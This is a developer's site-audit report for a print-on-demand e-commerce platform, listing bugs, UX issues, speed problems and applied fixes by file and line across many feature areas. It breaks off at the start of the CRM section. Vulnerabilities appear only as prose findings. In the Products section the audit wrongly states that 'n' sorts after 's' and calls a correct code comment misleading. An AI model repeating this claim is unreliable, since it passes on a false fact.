# ImagineThisPrinted — Site Audit Findings

Ongoing audit of every feature and flow on the platform.
Legend: 🔴 Broken | 🟡 Confusing/UX | 🟢 Works well | ⚡ Speed issue

---

## Audit Checklist

| # | Feature Area | Status |
|---|-------------|--------|
| 1 | Authentication & Authorization | ✅ 2026-04-29 (re-audit) |
| 2 | Products & Catalog | ✅ 2026-04-29 (re-audit) |
| 3 | Shopping Cart & Checkout | ✅ 2026-04-29 (re-audit) |
| 4 | Product Design & Customization | ✅ 2026-04-29 (re-audit) |
| 5 | Admin Dashboard | ✅ 2026-04-29 (re-audit) |
| 6 | Vendor Dashboard & Storefront | ✅ 2026-04-29 (re-audit) |
| 7 | Founder Dashboard & Earnings | ✅ 2026-04-29 (re-audit) |
| 8 | Wallet & Points System | ✅ 2026-04-29 (re-audit) |
| 9 | CRM & Customer Management | ✅ 2026-04-29 (re-audit) |
| 10 | Messaging & Communications | ✅ 2026-04-29 (re-audit) |
| 11 | Marketing & Content Tools | ✅ 2026-04-28 (re-audit) |
| 12 | Community & Creator Features | ✅ 2026-04-28 (re-audit) |
| 13 | 3D Models & Printing | ✅ 2026-04-28 (re-audit) |
| 14 | Mockup & Preview Generation | ✅ 2026-04-28 (re-audit) |
| 15 | Wholesale Portal | ✅ 2026-04-28 (re-audit) |
| 16 | AI & Voice Features | ✅ 2026-04-28 (re-audit) |
| 17 | Kiosk Mode | ✅ 2026-04-28 (re-audit) |
| 18 | User Profiles & Accounts | ✅ 2026-04-28 (re-audit) |
| 19 | Order Management | ✅ 2026-04-28 (re-audit) |
| 20 | Invoicing & Payments | ✅ 2026-04-28 (re-audit) |
| 21 | Shipping & Logistics | ✅ 2026-04-28 (re-audit) |
| 22 | Coupons & Gift Cards | ✅ 2026-04-28 (re-audit) |
| 23 | Referrals & Recommendations | ✅ 2026-04-28 (re-audit) |
| 24 | Support & Help | ✅ 2026-04-28 (re-audit) |
| 25 | Legal & Policies | ✅ 2026-04-28 (re-audit) |
| 26 | UI Layout & Navigation | ✅ 2026-04-28 (re-audit) |
| 27 | Notifications & Toast Messages | ✅ 2026-04-29 (re-audit) |
| 28 | Debug & Development | ✅ 2026-04-29 (re-audit) |
| 29 | Supporting Infrastructure | ✅ 2026-04-29 (re-audit) |
| 30 | Additional Components | ✅ 2026-04-29 (re-audit) |

---

## Authentication & Authorization (2026-03-12)

**What was checked:** All auth pages (Login, Signup, AuthCallback, AuthError), ProtectedRoute, AuthModal, SupabaseAuthContext, KioskAuthContext, supabase client, backend auth middleware, account routes. 17 files, ~1,800 lines reviewed.

### Correctness
- 🔴 **Legacy Prisma auth endpoints conflict with Supabase Auth** — `backend/routes/account.ts:60-165` has `/api/auth/login` and `/api/auth/register` using bcrypt+Prisma, but frontend uses Supabase Auth exclusively. Dead code creating security confusion.
- 🔴 **`/api/account/send-welcome-email` has no auth protection** — `backend/routes/account.ts:387-412` is publicly accessible, anyone can spam welcome emails. No rate limiting.
- 🔴 **ProtectedRoute doesn't check user roles** — `src/components/ProtectedRoute.tsx:8-23` only checks if user exists, not their role. Any logged-in user can access admin routes.
- 🔴 **JWT role extraction always fails, uncached DB fallback** — `backend/middleware/supabaseAuth.ts:45-55` tries `user_metadata.role` which is never set by Supabase. Falls back to DB query on every request with no caching.
- 🟢 **PKCE flow correctly implemented** — `src/lib/supabase.ts`, `AuthCallback.tsx` handle code exchange properly.
- 🟢 **OAuth (Google) well-implemented** — `SupabaseAuthContext.tsx:388-458` with state persistence.
- 🟢 **Session management solid** — Auto-refresh, retry logic, profile caching with TTL.

### Duplicate UX
- 🟢 **Single auth flow** — Login page, Signup page, and AuthModal all use the same `useAuth()` context methods. No conflicting flows.

### User Clarity
- 🟡 **Signup doesn't auto-login** — `src/pages/Signup.tsx:24-61` shows "check your email" message but leaves user stranded on signup page.
- 🟡 **Error message detection fragile** — `Login.tsx:230`, `Signup.tsx:134`, `AuthModal.tsx:137` use string matching (`message.includes('error')`) which can miscolor success messages.
- 🟢 **AuthError page excellent** — `src/pages/AuthError.tsx` provides helpful troubleshooting tips.

### Site Speed
- ⚡ **Profile + wallet fetches sequential** — `src/context/SupabaseAuthContext.tsx:142-193` could use `Promise.all()` to save ~100-150ms per login.
  - **Fix:** Document for later (complex refactor).
- ⚡ **Profile cache cleared on every page load** — `SupabaseAuthContext.tsx:279-282` clears cache unconditionally, even for same user.
  - **Fix:** Document for later.
- ⚡ **Backend role lookups not cached** — `backend/middleware/supabaseAuth.ts:119-131` queries DB on every admin request.
  - **Fix:** Document for later.

### Fixes Applied
- ✅ **AuthModal theme support fixed** — Changed `bg-white` to `bg-card text-text`, `text-gray-400` to `text-muted`, `border-gray-300` to `card-border`, `text-gray-600` to `text-muted` across all inputs and text.
  - File: `src/components/AuthModal.tsx`

### Verdict
4 critical issues found (legacy auth endpoints, unprotected email endpoint, missing role checks, uncached role lookups). 1 quick fix applied (AuthModal dark theme). 3 speed optimizations documented for later. Auth core (PKCE, OAuth, session management) is solid.

---

## Products & Catalog (2026-03-12)

**What was checked:** ProductCatalog, ProductPage, ProductCard, ProductRecommendations, ProductPreviewCarousel, Hero component. 6 files reviewed.

### Correctness
- 🔴 **Duplicate product status check** — `src/pages/ProductCatalog.tsx:27-28` checks BOTH `.eq('status', 'active')` AND `.eq('is_active', true)`. Unclear which is source of truth; may exclude products that only have one set correctly.
- 🔴 **"Load More Products" button was non-functional** — `src/pages/ProductCatalog.tsx:324-330` had a button with no onClick handler. Users would click it and nothing would happen.
  - **Fix applied:** Removed dead button.
- 🟡 **Misleading comment about alphabetical ordering** — `src/pages/ProductPage.tsx:71` comment says "'nobg' comes before 'source' alphabetically" but 'n' comes AFTER 's'. Logic works by accident since code uses `.find()` anyway.
- 🟡 **ProductCard image index out of bounds risk** — `src/components/ProductCard.tsx:87-96` hover carousel index can exceed bounds if products change while hovering.
- 🟢 **Error handling solid** — ProductPage has proper try-catch, shows "Product Not Found" for invalid IDs.
- 🟢 **Fallback images implemented** — All product images have Unsplash placeholder fallbacks + onError handlers.
- 🟢 **Category filtering works correctly** — URL params and state management sync properly.

### Duplicate UX
- 🟢 **Single product browsing flow** — Catalog → ProductCard → ProductPage is the only path. No conflicting views.

### User Clarity
- 🟡 **"In Stock" badge shows for all products** — `src/components/ProductCard.tsx:144-153` shows green badge on everything since out-of-stock items aren't filtered. Badge adds no information.
- 🟡 **Empty category message doesn't account for filters** — `src/pages/ProductCatalog.tsx:306-310` says "No products in category" but doesn't mention active sort/filter.
- 🟡 **Social badges can overlap with promo badges** — `src/components/ProductCard.tsx:123-162` stacks up to 3 badges at `top-2 left-2` with manual `mt-8`/`mt-16` offsets; can overflow on mobile.
- 🟢 **Sort options comprehensive** — Newest, Price Low/High, Popular all work.
- 🟢 **Product detail page well-structured** — Images, sizes, colors, add-to-cart, recommendations all present.

### Site Speed
- ⚡ **ProductPage fetches were sequential** — Product + assets queries ran one after the other.
  - **Fix applied:** Parallelized with `Promise.all()`, saving ~100-200ms per page load.
  - File: `src/pages/ProductPage.tsx:38-78`
- ⚡ **ProductCard fetches social posts on every mount** — `src/components/ProductCard.tsx:34-50` loads social data even when card isn't visible. Should use Intersection Observer.
  - **Fix:** Document for later (complex).
- ⚡ **No pagination or virtualization** — `src/pages/ProductCatalog.tsx:273-297` renders ALL products at once. With 200+ products, this slows initial render.
  - **Fix:** Document for later (complex).
- ⚡ **ProductPreviewCarousel images not lazy-loaded** — Mockup images loaded eagerly.
  - **Fix applied:** Added `loading="lazy"` to carousel images.
  - File: `src/components/ProductPreviewCarousel.tsx`
- 🟢 **ProductRecommendations properly memoized** — Uses `memo()`, `useCallback()`, and 2-minute cache.

### Fixes Applied
- ✅ **Parallelized ProductPage fetches** — Product + product_assets now load via `Promise.all()` (~100-200ms faster).
  - File: `src/pages/ProductPage.tsx`
- ✅ **Removed dead "Load More" button** — Non-functional button removed from catalog.
  - File: `src/pages/ProductCatalog.tsx`
- ✅ **Added lazy loading to carousel images** — Mockup and thumbnail images now use `loading="lazy"`.
  - File: `src/components/ProductPreviewCarousel.tsx`

### Verdict
2 broken items fixed (dead button, sequential fetches). 1 speed quick-win applied (lazy images). 4 UX issues and 2 complex speed optimizations documented for later. Product recommendations and core browsing flow are solid.

---

## Shopping Cart & Checkout (2026-03-13)

**What was checked:** Cart.tsx, Checkout.tsx, OrderSuccess.tsx, FloatingCart.tsx, PaymentForm.tsx, CartContext.tsx, stripe utils, backend stripe/orders/wallet routes. ~2,500 lines reviewed.

### Correctness
- 🔴 **Cart state NOT persisted to localStorage** — `src/context/CartContext.tsx` uses `useReducer` with no persistence. Page refresh = cart lost. Major user friction.
- 🔴 **Tax hardcoded at 8% everywhere** — `src/pages/Cart.tsx:139` and `src/pages/Checkout.tsx:322` both use `* 0.08`. Not configurable by state/country. Legal/compliance risk.
- 🔴 **Free shipping threshold hardcoded & duplicated** — Cart.tsx hardcodes $50 threshold and $9.99 shipping (lines 135, 153) while Checkout.tsx uses `shippingCalculator`. If calculator returns different values, Cart's promise is broken.
- 🔴 **ITC conversion math was inconsistent** — `Checkout.tsx:330` used `Math.floor()` while `Checkout.tsx:507` used `Math.ceil()`. Same operation, different rounding = different ITC amounts.
  - **Fix applied:** Changed line 330 to `Math.ceil()` to match line 507.
- 🟡 **`/api/wallet/process-itc-payment` endpoint may not exist** — `Checkout.tsx:479` calls this but backend may only have `process-full-itc-payment`. Needs verification.
- 🟢 **Stripe integration solid** — Payment intent creation/update, express checkout (Apple/Google Pay), metadata storage all correct.
- 🟢 **Coupon system works** — Validation, application, removal, free shipping flag all implemented with loading guards.
- 🟢 **Order draft restoration works** — `Checkout.tsx:213-277` properly restores abandoned carts from order metadata.
- 🟢 **Plus size upcharge correct** — $2.50 for 2XL+ applied correctly to both regular and 3-for-$25 items.
- 🟢 **Quantity management safe** — Zero quantity auto-removes items, no negatives possible.

### Duplicate UX
- 🟡 **Duplicate free shipping messaging in Cart** — Lines 150-181 show progress bar OR success message, then lines 183-189 showed ANOTHER "Add $X more" message that duplicated the progress bar.
  - **Fix applied:** Removed duplicate messaging block (lines 183-189).
- 🟢 **Single cart experience** — All add-to-cart paths converge to CartContext. FloatingCart shows same state as Cart page.

### User Clarity
- 🟡 **No cart image fallback** — `Cart.tsx:61` chains `mockupUrl || customDesign || product.images[0]` but if `images` is empty, shows broken image icon.
- 🟡 **ITC insufficient balance gives no guidance** — `Checkout.tsx:469-471` says "need X but have Y" without suggesting alternatives (partial ITC + card).
- 🟢 **Empty cart state handled** — Cart and Checkout both show empty states with browse buttons.
- 🟢 **Order success page excellent** — Confetti, timeline, order number, contact info, continue shopping links.
- 🟢 **Payment error handling clear** — PaymentForm shows errors inline, disables button while processing.

### Site Speed
- ⚡ **Stripe loaded at module level** — `Checkout.tsx:12` runs `loadStripe()` immediately, adding ~50KB even if user never visits checkout. Should be dynamic import.
  - **Fix:** Document for later (needs Elements wrapper refactor).
- ⚡ **Shipping recalculates on every address keystroke** — `Checkout.tsx:336` fires `calculateShipping()` on every change to address fields. Should debounce.
  - **Fix:** Document for later.

### Fixes Applied
- ✅ **Removed duplicate free shipping message** — Eliminated redundant "Add $X more" block that duplicated the progress bar in Cart.tsx.
  - File: `src/pages/Cart.tsx`
- ✅ **Fixed ITC conversion rounding inconsistency** — Changed `Math.floor` to `Math.ceil` in `Checkout.tsx:330` to match `Checkout.tsx:507`.
  - File: `src/pages/Checkout.tsx`

### Verdict
Cart and checkout flow is functionally solid with good Stripe integration, coupon support, and order recovery. Key gap: **no cart persistence** (users lose cart on refresh). Tax/shipping hardcoding creates compliance risk. 2 quick fixes applied (duplicate UX, ITC rounding). Stripe lazy loading and shipping debounce documented for later.

---

## Product Design & Customization (2026-03-13)

**What was checked:** ProductDesigner, ImaginationStation, ImaginationStationEnhanced, UserDesignDashboard, 16 imagination/ subcomponents (LeftSidebar, RightSidebar, SheetCanvas, LayersPanel, ObjectSettings, AddElementPanel, ExportPanel, MrImaginePanel, ReimagineItModal, ITPEnhanceModal, ITPEnhanceTools, SheetPresets, SaveStatus, ImageCompareModal, ImaginationErrorBoundary, ITCBalance), DesignStudioModal, DesignHistorySidebar. ~5,000+ lines reviewed.

### Correctness
- 🔴 **LeftSidebar has TODO handlers that do nothing** — `src/components/imagination/LeftSidebar.tsx:94-102` has `handleMrImagine` and `handleITPEnhance` that only `console.log('TODO')`. Buttons are wired to these dead handlers — users click and nothing happens.
- 🔴 **ImaginationStationEnhanced is a redundant wrapper** — `src/pages/ImaginationStationEnhanced.tsx` (110 lines) just wraps ImaginationStation with ErrorBoundary + Toaster. Should be consolidated.
- 🔴 **ProductDesigner.tsx is orphaned dead code** — Routes redirect `/designer` to `/imagination-station`. Full page (~300+ lines) never used.
- 🔴 **Image loading had no timeout** — `src/components/imagination/RightSidebar.tsx:17-58` `loadImageAndGetDimensions()` would hang forever on dead URLs.
  - **Fix applied:** Added 15-second timeout with fallback to default dimensions.
- 🔴 **DesignHistorySidebar unsafe token access** — `src/components/DesignHistorySidebar.tsx:50-51` passed potentially undefined token in Authorization header, causing `Bearer undefined` requests.
  - **Fix applied:** Added null check, early return if no session.
- 🟡 **ITCBalance has hardcoded pricing** — `src/components/imagination/ITCBalance.tsx:71,75` shows "5 ITC" and "3 ITC" instead of using pricing prop. Will desync if pricing changes.
- 🟡 **Repeated `layer_type` string checks (11+ instances)** — `ImaginationStation.tsx` checks `layer.layer_type === 'image' || layer.layer_type === 'ai_generated'` throughout. Should be extracted to `isImageLayer()` utility.
- 🟢 **Error boundary with crash recovery** — `ImaginationErrorBoundary.tsx` saves crash state, offers recovery, auto-save detection. Excellent.
- 🟢 **DPI calculations correct** — SheetCanvas properly converts between pixels/inches with aspect ratio preservation.
- 🟢 **DTF-aware prompt building** — MrImagineModal builds prompts with correct DTF print requirements and color rules.

### Duplicate UX
- 🟡 **Two sheet size selectors** — SheetPresets dropdown and admin-only dropdown in ImaginationStation both change sheet dimensions. Unclear precedence.
- 🟢 **Single design creation flow** — ImaginationStation is the canonical design tool. ProductDesigner redirects to it.

### User Clarity
- 🟡 **Canvas shows nothing when no layers exist** — LayersPanel shows "No layers yet" but main canvas is blank with no call-to-action.
- 🟡 **DPI warnings not prominent enough** — ExportPanel categorizes images as fail/warning but doesn't prominently surface which images have problems.
- 🟡 **"Insufficient ITC" errors not actionable** — Multiple components show error text without "Add ITC" button nearby.
- 🟢 **SaveStatus indicator works well** — Shows saved/saving/unsaved/offline/error states with timestamps.
- 🟢 **Zoom & pan controls excellent** — Proper constraints, touch support, smooth scaling.

### Site Speed
- ⚡ **SheetCanvas not memoized** — `src/components/imagination/SheetCanvas.tsx` re-renders full Konva Stage on every parent update. Should use `React.memo`.
  - **Fix:** Document for later (complex, needs careful prop comparison).
- ⚡ **Sequential file upload processing** — `LeftSidebar.tsx:55-82` processes uploaded files one-by-one in a loop instead of `Promise.all()`.
  - **Fix:** Document for later.
- ⚡ **No pagination for design history** — `DesignHistorySidebar.tsx:47-63` fetches ALL design sessions at once. Scales poorly.
  - **Fix:** Document for later.
- ⚡ **Konva event handlers have no cleanup** — `SheetCanvas.tsx:87-135` registers inline handlers without unmount cleanup. Potential memory leak.
  - **Fix:** Document for later (Konva inline handlers on JSX elements are cleaned up by React reconciliation, but worth monitoring).

### Fixes Applied
- ✅ **Added 15s timeout to image loading** — `loadImageAndGetDimensions()` now times out and falls back to defaults instead of hanging forever.
  - File: `src/components/imagination/RightSidebar.tsx`
- ✅ **Fixed unsafe token access** — Added null check for auth session before making API call. Prevents `Bearer undefined` requests.
  - File: `src/components/DesignHistorySidebar.tsx`

### Verdict
Imagination Station is architecturally sound with excellent error recovery, DPI handling, and AI prompt building. 3 dead code issues need cleanup (ProductDesigner, wrapper page, TODO handlers). 2 bugs fixed (image timeout, auth token). Multiple UX polish items and performance optimizations documented for later. The design tool core is solid.

---

## Admin Dashboard (2026-03-13)

**What was checked:** AdminDashboard, AdminPanel, AdminControlPanel, AdminCostOverride, AdminAIProductBuilder, AdminEmailTemplates, admin/ImaginationProducts, admin/VoiceSettings, AdminCreateProductWizard, AdminCouponManagement, AdminGiftCardManagement, AdminWalletManagement, AdminConnectManagement, AdminInvoiceManagement, AdminSupport, AdminNotificationBell, AdminCreatorProductsTab, and backend admin routes. ~4,000+ lines reviewed.

### Correctness
- 🔴 **VoiceSettings missing backend endpoints** — `src/pages/admin/VoiceSettings.tsx:15,27` calls `/api/ai/voice/settings` (GET/POST) but no backend route exists. Feature is completely non-functional — returns 404.
- 🟢 **All other admin routes properly protected** — Backend uses `requireAuth` + `requireRole(['admin'])` or `requireAdmin` middleware on all critical routes.
- 🟢 **AdminDashboard auth check solid** — Line 1587 validates role before rendering, with debug logging.
- 🟢 **Input validation present** — Product forms, wallet amounts, coupon codes all validated before submission.
- 🟢 **AdminEmailTemplates uses Promise.all correctly** — Line 138 parallelizes `loadTemplates(), loadLogs(), loadStats()`.

### Duplicate UX
- 🟡 **AdminPanel vs AdminControlPanel confusion** — Two separate admin pages with similar names but different purposes:
  - `AdminPanel.tsx` (566 lines): Database table browser, raw data viewer, create-user form
  - `AdminControlPanel.tsx` (574 lines): Platform settings (fees, payouts), earnings overview
  - Both are accessible from admin nav. Names don't communicate the difference.
- 🟢 **No conflicting management interfaces** — Coupons, gift cards, wallet, invoices each have a single management component.

### User Clarity
- 🟡 **Missing confirmation on destructive admin actions** — `AdminDashboard.tsx:612` `toggleFeatured()` runs without confirmation. `handleRemoveBackground()` (line 752) and `handleRegenerateImages()` (line 738) trigger AI jobs without confirmation.
- 🟢 **Empty states handled well** — All sections (products, jobs, pricing) show appropriate messages when no data exists.
- 🟢 **AdminSupport has live chat polling** — 5-second polling interval with proper cleanup. Good UX for support agents.
- 🟢 **AdminConnectManagement has retry button** — Error state provides "Retry" action instead of dead-ending.

### Site Speed
- ⚡ **GiftCardManagement had 3 sequential fetch pairs** — `src/components/AdminGiftCardManagement.tsx:103-104, 127-128, 148-149` called `fetchGiftCards()` then `fetchStats()` sequentially after create, bulk create, and delete.
  - **Fix applied:** Wrapped all 3 instances in `Promise.all()`.
- 🟢 **AdminDashboard uses Promise.all** — Line 783 parallelizes jobs + assets queries.
- 🟢 **AdminInvoiceManagement uses Promise.all** — Line 44 parallelizes invoices + stats.
- 🟢 **AdminControlPanel uses Promise.all** — Line 56 parallelizes settings + earnings.

### Fixes Applied
- ✅ **Parallelized GiftCardManagement fetches** — All 3 sequential `fetchGiftCards()/fetchStats()` pairs now use `Promise.all()` (~100-200ms faster per admin operation).
  - File: `src/components/AdminGiftCardManagement.tsx`

### Verdict
Admin dashboard is well-built overall — strong auth protection, good error handling, proper data parallelization in most components. One broken feature (VoiceSettings has no backend). Naming confusion between AdminPanel and AdminControlPanel. 1 speed fix applied (gift card fetches). Most admin components follow good patterns.

---

## Vendor Dashboard & Storefront (2026-03-13)

**What was checked:** VendorDashboard, VendorStorefront, VendorStorefrontManager, VendorDirectory, VendorMessages, VendorPayouts, UserProductCreator, vendor-payouts.ts, vendor-analytics.ts. 9 files reviewed.

### Correctness
- 🔴 **VendorDashboard uses hardcoded mock data** — `src/pages/VendorDashboard.tsx:27-67` has mock analytics (`totalSales: 542.30`, `thisMonth: 123.45`) and mock products. Line 34 comment literally says "Mock data - replace with real PostgreSQL queries". Vendors see fake numbers.
- 🔴 **Product submission never saves to database** — `src/pages/VendorDashboard.tsx:128-164` `handleSubmitProduct()` only does `setProducts([...products, product])` — local state only, no API call. Products disappear on refresh.
- 🔴 **Storefront URL validation is mock** — `src/pages/VendorStorefrontManager.tsx:191-201` `checkUrlAvailability()` only checks against a hardcoded array (`['admin', 'api', 'www']`), never queries the database. Vendors can reserve already-taken URLs.
- 🔴 **Duplicate interface definitions** — Both `VendorStorefront.tsx` and `VendorStorefrontManager.tsx` define `VendorStorefrontTheme` and `VendorStorefrontConfig` independently. Changes in one won't sync with the other.
- 🟡 **VendorDirectory restricted to wholesale role only** — `src/pages/VendorDirectory.tsx:237` checks `user.role !== 'wholesale'`, blocking vendors from browsing other vendors. May be intentional but seems overly restrictive.
- 🟢 **VendorPayouts uses Promise.all correctly** — Lines 30-35 load 4 data sources in parallel.
- 🟢 **Vendor payout calculations correct** — `vendor-payouts.ts:32-51` Platform (7%) + Stripe (3.5%) = 10.5% total fee, math verified.
- 🟢 **Auth checks present** — All vendor pages validate `user.role === 'vendor'` before rendering.

### Duplicate UX
- 🟡 **Three product management interfaces** — VendorDashboard has Products tab (lines 269-345), Submit tab (lines 395-573), and VendorStorefrontManager has its own product view. No guidance on which to use.
- 🟡 **Dead "Request Quote" button** — `src/pages/VendorStorefront.tsx:680-682` has a button with no onClick handler. Users click and nothing happens.

### User Clarity
- 🟡 **Empty state messaging too generic** — `VendorDashboard.tsx:281-290` says "You haven't added any products yet" with no onboarding guidance or next steps.
- 🟡 **Payout status lacks timestamps** — VendorPayouts shows pending/processing/paid status but no estimated completion dates or payout schedule.
- 🟢 **VendorMessages well-built** — Search, filtering, threading, auto-scroll, file upload, unread badges all working.
- 🟢 **VendorDirectory filtering solid** — Multiple filter types, search across fields, view mode toggle.
- 🟢 **Theme system used correctly** — All vendor pages use semantic tokens (`bg-card`, `text-text`, `text-muted`), no hardcoded colors.

### Site Speed
- ⚡ **Catalog products reload on every tab switch** — `VendorDashboard.tsx:69-73` reloads catalog data every time the tab is selected. No caching.
  - **Fix:** Document for later (add state caching).
- ⚡ **VendorDirectory filter not memoized** — `VendorDirectory.tsx:168-228` recalculates filter on every render. Should use `useMemo`.
  - **Fix:** Document for later.
- ⚡ **No pagination on vendor lists** — `VendorDirectory.tsx:388-400` renders all filtered vendors at once.
  - **Fix:** Document for later.

### Fixes Applied
- None — issues in this area are architectural (mock data, missing backend integration) rather than quick code fixes.

### Verdict
**~40% of vendor features are incomplete mock implementations.** The core architecture (messaging, payouts, directory filtering, theme usage) is solid, but VendorDashboard is non-functional with hardcoded data and no database integration. Product submission doesn't persist. Storefront URL validation is fake. This area needs significant backend development before it's production-ready. No quick fixes were applicable.

---

## Founder Dashboard & Earnings (2026-03-13)

**What was checked:** FoundersDashboard, FounderEarnings, CreatorAnalytics, founder-earnings.ts utility, backend invoices routes. 5 files, ~2,500 lines reviewed.

### Correctness
- 🔴 **founder-earnings.ts is entirely mock data** — `src/utils/founder-earnings.ts:149-190,238-280,305-346,418-426` all methods return hardcoded mock data. `getFounderEarnings()`, `generateEarningsReport()`, `getProductCOGS()`, `getEarningsAnalytics()` never query the database.
- 🔴 **Database operations are no-ops** — `founder-earnings.ts:354-362` `updateProductCOGS()` only logs to console. `saveFounderEarnings()` (line 488-491) only logs. `processFounderPayout()` modifies in-memory array, doesn't persist.
- 🔴 **Two disconnected earnings systems** — FoundersDashboard uses `/api/invoices` (real backend), while FounderEarnings uses `founderEarningsService` (mock data). Two conflicting sources of truth, no data integration.
- 🔴 **`form-select` CSS class undefined** — `src/pages/FounderEarnings.tsx:152,391` used `className="form-select"` but class doesn't exist in CSS. Select dropdowns rendered unstyled.
  - **Fix applied:** Replaced with proper Tailwind classes.
- 🔴 **CreatorAnalytics hardcoded colors broke dark mode** — `src/components/CreatorAnalytics.tsx` used `bg-white`, `text-gray-800`, `text-gray-500`, `border-gray-100` throughout (~15 instances). Component completely ignored theme.
  - **Fix applied:** Replaced all hardcoded colors with theme tokens (`bg-card`, `text-text`, `text-muted`, `card-border`, `bg-bg`).
- 🟢 **Invoice creation flow solid** — `backend/routes/invoices.ts:188-330` has proper auth, Stripe integration, transaction safety, line item validation.
- 🟢 **FoundersDashboard (invoice-based) works** — Real API calls, loading states, empty state handled, theme-aware styling.
- 🟢 **Role-based access control correct** — Both frontend and backend validate founder/admin role.
- 🟢 **Promise.all used correctly** — FoundersDashboard (line 50-53) and FounderEarnings (line 51-60) both parallelize data loading.

### Duplicate UX
- 🟡 **FoundersDashboard vs FounderEarnings overlap** — Both show earnings data but from different sources. Routes `/founders`, `/founder/dashboard`, `/founder/earnings` exist — unclear which is primary.
- 🟡 **CreatorAnalytics in VendorDashboard** — Creator tab in VendorDashboard renders CreatorAnalytics, mixing creator and vendor concepts.

### User Clarity
- 🟡 **No empty state in FounderEarnings tabs** — Overview shows mock data even with 0 earnings. Earnings tab shows empty table with no guidance.
- 🟡 **Errors hidden from user** — `FounderEarnings.tsx:66-68,84-86,106-108` errors only logged to console, never shown to user. Loading spinner persists indefinitely on errors.
- 🟡 **`alert()` and `prompt()` used for COGS editing** — `FounderEarnings.tsx:547` uses browser `prompt()` for input, `alert()` for feedback. Breaks modern UX patterns.
- 🟢 **35% profit share clearly communicated** — Header says "Track your 35% profit share" with breakdown in overview cards.

### Site Speed
- ⚡ **All data loaded on mount regardless of tab** — `FounderEarnings.tsx:51-60` loads earnings, report, analytics, and COGS on page load even if user never visits those tabs.
  - **Fix:** Document for later (lazy-load by tab).
- ⚡ **No pagination on earnings table** — Renders all earnings at once.
  - **Fix:** Document for later.
- 🟢 **Promise.all used for parallel loading** — Both pages parallelize their API calls correctly.

### Fixes Applied
- ✅ **Fixed undefined `form-select` class** — Replaced with proper theme-aware Tailwind classes (`bg-card text-text border card-border rounded-md`) in both select elements.
  - File: `src/pages/FounderEarnings.tsx`
- ✅ **Fixed CreatorAnalytics dark mode** — Replaced all hardcoded colors (`bg-white`, `text-gray-800`, `text-gray-500`, `border-gray-100`, `bg-gray-100`) with theme tokens (`bg-card`, `text-text`, `text-muted`, `card-border`, `bg-bg`) across ~15 instances.
  - File: `src/components/CreatorAnalytics.tsx`

### Verdict
Similar to Vendor area: **FounderEarnings is built on mock data** — all utility methods return hardcoded values and DB writes are no-ops. The invoice-based FoundersDashboard works (real Stripe integration, proper backend), but FounderEarnings is non-functional. Two competing earnings systems need unification. 2 visual/styling fixes applied (form-select, dark mode colors).

---

## Wallet & Points System (2026-03-13)

**What was checked:** Wallet.tsx, ITCBalance.tsx, AdminWalletManagement.tsx, stripe-itc.ts, backend wallet.ts, backend admin/wallet.ts. 6 files, ~2,000+ lines reviewed.

### Correctness
- 🔴 **Legacy ITC bridge had wrong conversion rate** — `src/utils/stripe-itc.ts:192-193` `stripeITCBridge` used `0.10` (10x too high) instead of `0.01`. While currently unused, any future use would calculate balances 10x wrong.
  - **Fix applied:** Changed to `0.01` to match all active code.
- 🟡 **Inconsistent HTTP status for insufficient balance** — `backend/routes/wallet.ts:644` returns 402 for insufficient ITC on `/deduct-itc`, while other endpoints (lines 549, 748) return 400. Frontend error handling may behave inconsistently.
- 🟡 **VITE_SITE_URL used on backend** — `wallet.ts:967` uses `process.env.VITE_SITE_URL` (VITE_ prefix) on server-side code. Should be `SITE_URL`.
- 🟢 **ITC conversion rate consistent in all active code** — All active code uses 0.01 (1 ITC = $0.01): Wallet.tsx:44, AdminWalletManagement.tsx:35, Checkout.tsx:324/330/507.
- 🟢 **Transaction logging with full audit trail** — Every wallet operation logs type, amount, balance_after, reference_type, reference_id, description, metadata.
- 🟢 **Balance calculations correct** — Read→validate→calculate→update pattern used consistently. No double-spending risk.
- 🟢 **All endpoints require auth** — User endpoints use `requireAuth`, admin endpoints use `requireAuth` + `requireAdmin`.
- 🟢 **User isolation enforced** — All queries filtered by `user_id` from auth token. Users can't access other wallets.
- 🟢 **Table names and column names correct** — `user_wallets`, `itc_transactions`, `stripe_connect_accounts`, `payout_requests`, `itc_cashout_requests` all verified.
- 🟢 **No dead imports found** — All imports in Wallet.tsx and AdminWalletManagement.tsx are used.

### Duplicate UX
- 🟡 **4 separate ITC balance displays** — Wallet.tsx, ITCBalance.tsx sidebar, DesignStudioModal, LeftSidebar all show balance independently. No cross-component sync — spending ITC in one view leaves others stale.
- 🟡 **Two cashout methods without clear differentiation** — Payout Requests (manual, 5% fee) and Stripe Connect Instant Cashout (direct to card, variable fee). User unclear on which to use.

### User Clarity
- 🟡 **ITC concept not explained** — Wallet page doesn't explain what ITC is, how to earn it, or where it's used. Only pricing info is in ITCBalance sidebar.
- 🟡 **No pagination UI for transactions** — Backend supports `limit` & `offset` but frontend loads first 50 with no "Load More" or page controls. Users with >50 transactions can't see older history.
- 🟢 **Balance display excellent** — Large font, locale-formatted, color-coded (purple normal, yellow warning at <10 ITC), animated "Low Balance" indicator.
- 🟢 **Empty states handled** — Both Overview and History tabs show "No transactions yet" with icon.
- 🟢 **Transaction history clear** — Shows date, type, amount (±), USD equivalent, description.
- 🟢 **Admin wallet management solid** — Form validation, balance preview before confirmation, two-step confirmation dialog, search by username/email.

### Site Speed
- ⚡ **Cashout tab loaded sequentially** — `Wallet.tsx:276-277` called `loadConnectStatus()` then `loadCashoutHistory()` sequentially.
  - **Fix applied:** Wrapped in `Promise.all()`.
- ⚡ **Wallet + transactions loaded sequentially** — `Wallet.tsx:83-103` loads wallet balance, then awaits transaction history. Could parallelize.
  - **Fix:** Document for later (wallet balance is needed for UI before transactions).

### Fixes Applied
- ✅ **Fixed legacy ITC conversion rate** — Changed `stripeITCBridge` from `0.10` to `0.01` to match correct rate (1 ITC = $0.01).
  - File: `src/utils/stripe-itc.ts`
- ✅ **Parallelized cashout tab loading** — `loadConnectStatus()` and `loadCashoutHistory()` now run via `Promise.all()`.
  - File: `src/pages/Wallet.tsx`

### Verdict
**The wallet system is one of the best-built areas of the platform.** Solid audit trail, correct calculations, proper auth isolation, good admin tools, excellent balance display. The legacy bridge conversion rate was wrong (fixed). Minor issues: no transaction pagination UI, stale balance across components, and two unclear cashout methods. Core financial logic is trustworthy.

---

## CRM & Customer Management (2026-03-13)

**What was checked:** CRM.tsx, CustomerMessages.tsx, messaging.ts utility, VendorMessages.tsx (for comparison), backend routes for messaging. 4 files, ~2,400 lines reviewed.

### Correctness
